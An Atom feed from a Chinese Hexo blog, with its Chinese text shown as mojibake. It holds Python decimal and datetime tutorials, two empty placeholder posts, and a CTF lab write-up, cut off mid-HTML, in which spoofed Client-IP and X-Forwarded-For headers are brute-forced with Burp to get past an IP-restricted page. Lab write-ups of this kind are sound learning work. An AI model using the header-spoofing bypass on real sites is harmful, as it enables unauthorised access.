<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>æ™¨æ›¦çš„å°å±‹</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-03-30T08:46:25.589Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>æ™¨æ›¦</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>py decimalåº“</title>
    <link href="http://example.com/2025/03/30/python/py-decimal/"/>
    <id>http://example.com/2025/03/30/python/py-decimal/</id>
    <published>2025-03-30T16:45:50.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="decimal-åº“ç®€ä»‹"><a href="#decimal-åº“ç®€ä»‹" class="headerlink" title="decimal åº“ç®€ä»‹"></a>decimal åº“ç®€ä»‹</h2><p>decimal æ˜¯ Python æ ‡å‡†åº“ä¸­ç”¨äºåè¿›åˆ¶æµ®ç‚¹è¿ç®—çš„æ¨¡å—ï¼Œå®ƒæä¾›äº† Decimal ç±»æ¥è¿›è¡Œç²¾ç¡®çš„åè¿›åˆ¶æ•°å­¦è®¡ç®—ã€‚ä¸å†…ç½®çš„ float ç±»å‹ç›¸æ¯”ï¼ŒDecimal å¯ä»¥ï¼š</p><ul><li>ç²¾ç¡®æ§åˆ¶ç²¾åº¦</li><li>æ­£ç¡®å¤„ç†å°æ•°è®¡ç®—</li><li>æ¶ˆé™¤æµ®ç‚¹æ•°è®¡ç®—ä¸­çš„ç²¾åº¦è¯¯å·®</li></ul><h2 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h2><h3 id="1-åˆ›å»º-Decimal-å¯¹è±¡"><a href="#1-åˆ›å»º-Decimal-å¯¹è±¡" class="headerlink" title="1. åˆ›å»º Decimal å¯¹è±¡"></a>1. åˆ›å»º Decimal å¯¹è±¡</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸºæœ¬åˆ›å»ºæ–¹å¼</span></span><br><span class="line">d1 = Decimal(<span class="string">&#x27;0.1&#x27;</span>)</span><br><span class="line">d2 = Decimal(<span class="string">&#x27;0.2&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;d1 + d2 = <span class="subst">&#123;d1 + d2&#125;</span>&quot;</span>)  <span class="comment"># è¾“å‡ºï¼š0.3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹æ¯” float</span></span><br><span class="line">f1 = <span class="number">0.1</span></span><br><span class="line">f2 = <span class="number">0.2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;f1 + f2 = <span class="subst">&#123;f1 + f2&#125;</span>&quot;</span>)  <span class="comment"># è¾“å‡ºï¼š0.30000000000000004</span></span><br></pre></td></tr></table></figure></div><h3 id="2-ç²¾åº¦æ§åˆ¶"><a href="#2-ç²¾åº¦æ§åˆ¶" class="headerlink" title="2. ç²¾åº¦æ§åˆ¶"></a>2. ç²¾åº¦æ§åˆ¶</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®å…¨å±€ç²¾åº¦</span></span><br><span class="line">getcontext().prec = <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(Decimal(<span class="string">&#x27;1&#x27;</span>) / Decimal(<span class="string">&#x27;3&#x27;</span>))  <span class="comment"># è¾“å‡ºï¼š0.3333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸´æ—¶æ”¹å˜ç²¾åº¦</span></span><br><span class="line"><span class="keyword">with</span> localcontext() <span class="keyword">as</span> ctx:</span><br><span class="line">    ctx.prec = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(Decimal(<span class="string">&#x27;1&#x27;</span>) / Decimal(<span class="string">&#x27;3&#x27;</span>))  <span class="comment"># è¾“å‡ºï¼š0.33</span></span><br></pre></td></tr></table></figure></div><h3 id="3-å››èˆäº”å…¥"><a href="#3-å››èˆäº”å…¥" class="headerlink" title="3. å››èˆäº”å…¥"></a>3. å››èˆäº”å…¥</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, ROUND_HALF_UP, ROUND_DOWN</span><br><span class="line"></span><br><span class="line">num = Decimal(<span class="string">&#x27;3.14159&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å››èˆäº”å…¥åˆ°æŒ‡å®šä½æ•°</span></span><br><span class="line"><span class="built_in">print</span>(num.quantize(Decimal(<span class="string">&#x27;0.01&#x27;</span>), ROUND_HALF_UP))  <span class="comment"># è¾“å‡ºï¼š3.14</span></span><br><span class="line"><span class="built_in">print</span>(num.quantize(Decimal(<span class="string">&#x27;0.1&#x27;</span>), ROUND_HALF_UP))   <span class="comment"># è¾“å‡ºï¼š3.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘ä¸‹å–æ•´</span></span><br><span class="line"><span class="built_in">print</span>(num.quantize(Decimal(<span class="string">&#x27;0.01&#x27;</span>), ROUND_DOWN))     <span class="comment"># è¾“å‡ºï¼š3.14</span></span><br></pre></td></tr></table></figure></div><h3 id="4-æ•°å­¦è¿ç®—"><a href="#4-æ•°å­¦è¿ç®—" class="headerlink" title="4. æ•°å­¦è¿ç®—"></a>4. æ•°å­¦è¿ç®—</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line">a = Decimal(<span class="string">&#x27;1.5&#x27;</span>)</span><br><span class="line">b = Decimal(<span class="string">&#x27;2.5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸºæœ¬è¿ç®—</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;åŠ æ³•ï¼š<span class="subst">&#123;a + b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;å‡æ³•ï¼š<span class="subst">&#123;a - b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ä¹˜æ³•ï¼š<span class="subst">&#123;a * b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;é™¤æ³•ï¼š<span class="subst">&#123;a / b&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å–æ•´å’Œä½™æ•°</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;å‘ä¸‹å–æ•´ï¼š<span class="subst">&#123;a.floor()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;å‘ä¸Šå–æ•´ï¼š<span class="subst">&#123;b.ceil()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;å–ä½™ï¼š<span class="subst">&#123;a % b&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="å¸¸ç”¨æ–¹æ³•å’Œå±æ€§"><a href="#å¸¸ç”¨æ–¹æ³•å’Œå±æ€§" class="headerlink" title="å¸¸ç”¨æ–¹æ³•å’Œå±æ€§"></a>å¸¸ç”¨æ–¹æ³•å’Œå±æ€§</h2><table><thead><tr><th>æ–¹æ³•&#x2F;å±æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>as_tuple()</td><td>è¿”å›æ•°å€¼çš„å…ƒç»„è¡¨ç¤º</td></tr><tr><td>quantize()</td><td>è®¾ç½®å°æ•°ä½æ•°</td></tr><tr><td>normalize()</td><td>è§„èŒƒåŒ–è¡¨ç¤º</td></tr><tr><td>is_finite()</td><td>æ£€æŸ¥æ˜¯å¦ä¸ºæœ‰é™æ•°</td></tr><tr><td>is_infinite()</td><td>æ£€æŸ¥æ˜¯å¦ä¸ºæ— ç©·å¤§</td></tr><tr><td>is_nan()</td><td>æ£€æŸ¥æ˜¯å¦ä¸º NaN</td></tr></tbody></table><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ul><li>Decimal å¯¹è±¡ä¹‹é—´å¯ä»¥è¿›è¡Œç®—æœ¯è¿ç®—ï¼Œä½†ä¸èƒ½ç›´æ¥ä¸ float ç±»å‹æ··åˆè¿ç®—</li><li>ä½¿ç”¨å­—ç¬¦ä¸²åˆå§‹åŒ– Decimal å¯¹è±¡å¯ä»¥é¿å…æµ®ç‚¹æ•°ç²¾åº¦é—®é¢˜</li><li>è®¾ç½®å…¨å±€ç²¾åº¦ä¼šå½±å“æ‰€æœ‰åç»­çš„è®¡ç®—</li><li>åœ¨é‡‘èè®¡ç®—ç­‰éœ€è¦ç²¾ç¡®å°æ•°è®¡ç®—çš„åœºæ™¯ä¸­ï¼Œåº”ä¼˜å…ˆä½¿ç”¨ Decimal</li></ul><h2 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h2><ol><li><p>é‡‘èè®¡ç®—</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line">price = Decimal(<span class="string">&#x27;19.99&#x27;</span>)</span><br><span class="line">tax_rate = Decimal(<span class="string">&#x27;0.15&#x27;</span>)</span><br><span class="line">quantity = Decimal(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">total = price * quantity</span><br><span class="line">tax = total * tax_rate</span><br><span class="line">final_price = total + tax</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;æ€»ä»·ï¼š<span class="subst">&#123;final_price&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div></li><li><p>ç§‘å­¦è®¡ç®—</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">50</span>  <span class="comment"># è®¾ç½®é«˜ç²¾åº¦</span></span><br><span class="line">pi = Decimal(<span class="string">&#x27;3.14159265358979323846264338327950288419716939937510&#x27;</span>)</span><br><span class="line">radius = Decimal(<span class="string">&#x27;2.5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">area = pi * radius * radius</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;åœ†çš„é¢ç§¯ï¼š<span class="subst">&#123;area&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="pyåº“" scheme="http://example.com/tags/py%E5%BA%93/"/>
    
    <category term="decimal" scheme="http://example.com/tags/decimal/"/>
    
  </entry>
  
  <entry>
    <title>py datetimeåº“</title>
    <link href="http://example.com/2025/03/30/python/py-datetime/"/>
    <id>http://example.com/2025/03/30/python/py-datetime/</id>
    <published>2025-03-30T16:38:50.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="datetime-åº“ç®€ä»‹"><a href="#datetime-åº“ç®€ä»‹" class="headerlink" title="datetime åº“ç®€ä»‹"></a>datetime åº“ç®€ä»‹</h2><p>datetime æ˜¯ Python å†…ç½®çš„æ—¥æœŸå’Œæ—¶é—´å¤„ç†åº“ï¼Œæä¾›äº†å¤„ç†æ—¥æœŸå’Œæ—¶é—´çš„ç±»å’Œå‡½æ•°ã€‚ä¸»è¦åŒ…å«ä»¥ä¸‹å¸¸ç”¨ç±»ï¼š</p><ul><li>datetimeï¼šåŒæ—¶åŒ…å«æ—¥æœŸå’Œæ—¶é—´ä¿¡æ¯</li><li>dateï¼šä»…åŒ…å«æ—¥æœŸä¿¡æ¯</li><li>timeï¼šä»…åŒ…å«æ—¶é—´ä¿¡æ¯</li><li>timedeltaï¼šè¡¨ç¤ºæ—¶é—´é—´éš”</li></ul><h2 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h2><h3 id="1-è·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´"><a href="#1-è·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´" class="headerlink" title="1. è·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´"></a>1. è·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´</span></span><br><span class="line">now = datetime.now()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;å½“å‰æ—¶é—´ï¼š<span class="subst">&#123;now&#125;</span>&quot;</span>)  <span class="comment"># è¾“å‡ºæ ¼å¼å¦‚ï¼š2025-03-30 16:38:50.123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å¹´ã€æœˆã€æ—¥ã€æ—¶ã€åˆ†ã€ç§’</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;å¹´ï¼š<span class="subst">&#123;now.year&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;æœˆï¼š<span class="subst">&#123;now.month&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;æ—¥ï¼š<span class="subst">&#123;now.day&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;æ—¶ï¼š<span class="subst">&#123;now.hour&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;åˆ†ï¼š<span class="subst">&#123;now.minute&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ç§’ï¼š<span class="subst">&#123;now.second&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="2-æ—¥æœŸæ ¼å¼åŒ–"><a href="#2-æ—¥æœŸæ ¼å¼åŒ–" class="headerlink" title="2. æ—¥æœŸæ ¼å¼åŒ–"></a>2. æ—¥æœŸæ ¼å¼åŒ–</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">now = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æ—¥æœŸè½¬æ¢ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">date_str = now.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;æ ¼å¼åŒ–æ—¥æœŸï¼š<span class="subst">&#123;date_str&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ—¥æœŸ</span></span><br><span class="line">date_obj = datetime.strptime(<span class="string">&quot;2025-03-30 16:38:50&quot;</span>, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;è§£æçš„æ—¥æœŸï¼š<span class="subst">&#123;date_obj&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="3-æ—¥æœŸè®¡ç®—"><a href="#3-æ—¥æœŸè®¡ç®—" class="headerlink" title="3. æ—¥æœŸè®¡ç®—"></a>3. æ—¥æœŸè®¡ç®—</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line">now = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ—¥æœŸåŠ å‡</span></span><br><span class="line">tomorrow = now + timedelta(days=<span class="number">1</span>)</span><br><span class="line">yesterday = now - timedelta(days=<span class="number">1</span>)</span><br><span class="line">next_hour = now + timedelta(hours=<span class="number">1</span>)</span><br><span class="line">last_week = now - timedelta(weeks=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;æ˜å¤©ï¼š<span class="subst">&#123;tomorrow&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;æ˜¨å¤©ï¼š<span class="subst">&#123;yesterday&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ä¸€å°æ—¶åï¼š<span class="subst">&#123;next_hour&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ä¸Šå‘¨ï¼š<span class="subst">&#123;last_week&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="4-æ—¶åŒºå¤„ç†"><a href="#4-æ—¶åŒºå¤„ç†" class="headerlink" title="4. æ—¶åŒºå¤„ç†"></a>4. æ—¶åŒºå¤„ç†</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> pytz</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæ—¶åŒºå¯¹è±¡</span></span><br><span class="line">tz_utc = pytz.UTC</span><br><span class="line">tz_cn = pytz.timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å½“å‰æ—¶åŒºçš„æ—¶é—´</span></span><br><span class="line">cn_time = datetime.now(tz_cn)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ä¸­å›½æ—¶é—´ï¼š<span class="subst">&#123;cn_time&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ—¶åŒºè½¬æ¢</span></span><br><span class="line">utc_time = cn_time.astimezone(tz_utc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;UTCæ—¶é—´ï¼š<span class="subst">&#123;utc_time&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="å¸¸ç”¨æ ¼å¼åŒ–ç¬¦å·"><a href="#å¸¸ç”¨æ ¼å¼åŒ–ç¬¦å·" class="headerlink" title="å¸¸ç”¨æ ¼å¼åŒ–ç¬¦å·"></a>å¸¸ç”¨æ ¼å¼åŒ–ç¬¦å·</h2><table><thead><tr><th>ç¬¦å·</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>%Y</td><td>å¹´ä»½ï¼ˆå¦‚ï¼š2025ï¼‰</td></tr><tr><td>%m</td><td>æœˆä»½ï¼ˆ01-12ï¼‰</td></tr><tr><td>%d</td><td>æ—¥æœŸï¼ˆ01-31ï¼‰</td></tr><tr><td>%H</td><td>24å°æ—¶åˆ¶ï¼ˆ00-23ï¼‰</td></tr><tr><td>%I</td><td>12å°æ—¶åˆ¶ï¼ˆ01-12ï¼‰</td></tr><tr><td>%M</td><td>åˆ†é’Ÿï¼ˆ00-59ï¼‰</td></tr><tr><td>%S</td><td>ç§’ï¼ˆ00-59ï¼‰</td></tr><tr><td>%f</td><td>å¾®ç§’ï¼ˆ000000-999999ï¼‰</td></tr><tr><td>%A</td><td>æ˜ŸæœŸå‡ çš„å®Œæ•´åç§°</td></tr><tr><td>%a</td><td>æ˜ŸæœŸå‡ çš„ç®€å†™</td></tr><tr><td>%B</td><td>æœˆä»½åç§°</td></tr><tr><td>%b</td><td>æœˆä»½ç®€å†™</td></tr></tbody></table><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ul><li>datetime å¯¹è±¡æ˜¯ä¸å¯å˜çš„ï¼ˆimmutableï¼‰</li><li>è¿›è¡Œæ—¶åŒºæ“ä½œæ—¶éœ€è¦å®‰è£… pytz åº“ï¼š<code>pip install pytz</code></li><li>åœ¨å¤„ç†æ—¶åŒºæ—¶ï¼Œå»ºè®®å§‹ç»ˆä½¿ç”¨ aware datetimeï¼ˆåŒ…å«æ—¶åŒºä¿¡æ¯çš„datetimeå¯¹è±¡ï¼‰</li><li>åœ¨æ•°æ®åº“æ“ä½œä¸­ï¼Œå»ºè®®ç»Ÿä¸€ä½¿ç”¨ UTC æ—¶é—´ï¼Œå±•ç¤ºæ—¶å†è½¬æ¢ä¸ºæœ¬åœ°æ—¶é—´</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="datetime" scheme="http://example.com/tags/datetime/"/>
    
    <category term="pyåº“" scheme="http://example.com/tags/py%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2025/03/30/java/maven/maven%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2025/03/30/java/maven/maven%E9%85%8D%E7%BD%AE/</id>
    <published>2025-03-30T08:46:25.589Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æœ‰æ—¶é—´å†è¡¥</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2025/03/30/java/servlet/servlet/"/>
    <id>http://example.com/2025/03/30/java/servlet/servlet/</id>
    <published>2025-03-30T08:46:25.589Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æœ‰æ—¶é—´å†è¡¥</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ç¦æ­¢è®¿é—®</title>
    <link href="http://example.com/2025/03/29/web/ichunqiu/%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE/"/>
    <id>http://example.com/2025/03/29/web/ichunqiu/%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE/</id>
    <published>2025-03-29T22:38:43.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æŠ“ä¸ªåŒ…</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 29 Mar 2025 14:55:23 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 463</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/7.2.34</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;ç¦æ­¢è®¿é—®&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;index.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h1&gt;403 Forbidden&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;You are not authorized to access this resource.&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;If you think this is a mistake, please contact the website administrator.&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- error client-ip, plz use 192.168.*.* --&gt;</span><br></pre></td></tr></table></figure></div><p>æˆ‘ä»¬çœ‹åˆ°</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- error client-ip, plz use 192.168.*.* --&gt;</span><br></pre></td></tr></table></figure></div><p>ç”¨burpçˆ†ï¼Œåä¸¤ä½ä»1-255éå†</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: eci-2ze7s4z2n49ytjonezu9.cloudeci1.ichunqiu.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">X-Forwarded-For: 192.168.Â§1Â§.Â§1Â§</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure></div><p>ä»€ä¹ˆä¸œè¥¿éƒ½æ²¡æœ‰ï¼ˆ</p><p>åˆå®¡äº†ä¸€é<br>è€ƒè™‘ç”¨Client-IP</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: eci-2ze7s4z2n49ytjonezu9.cloudeci1.ichunqiu.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Client-IP: 192.168.Â§1Â§.Â§1Â§</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>è¿™å›çˆ†å‡ºæ¥äº†,tmçš„å±…ç„¶192.168.1.1</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 29 Mar 2025 15:06:06 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 460</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/7.2.34</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;ç¦æ­¢è®¿é—®&lt;/title&gt;</span><br><span class="line">    &lt;link 